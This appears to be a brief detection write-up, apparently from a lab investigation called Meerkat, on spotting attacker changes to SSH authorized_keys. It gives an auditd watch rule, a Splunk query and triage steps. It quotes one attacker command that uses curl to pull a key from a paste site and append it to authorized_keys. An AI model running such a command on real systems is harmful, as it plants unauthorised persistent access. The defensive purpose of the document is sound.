# authorized_keys changed

In Meerkat the attacker ran a script that added his key:

```
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
```

MITRE: T1098.004

Needs auditd watching the file:

```
-w /home/ubuntu/.ssh/authorized_keys -p wa -k ssh_keys
```

```spl
index=linux sourcetype=linux:audit key=ssh_keys
| table _time host uid comm exe
```

If comm is curl, wget, bash or the web app user changed it - very suspicious.

What to check:
- who changed it and was it expected
- compare keys in the file with known ones
- auth.log for ssh logins after the change

False positive: admin adding a key by hand, Ansible etc.
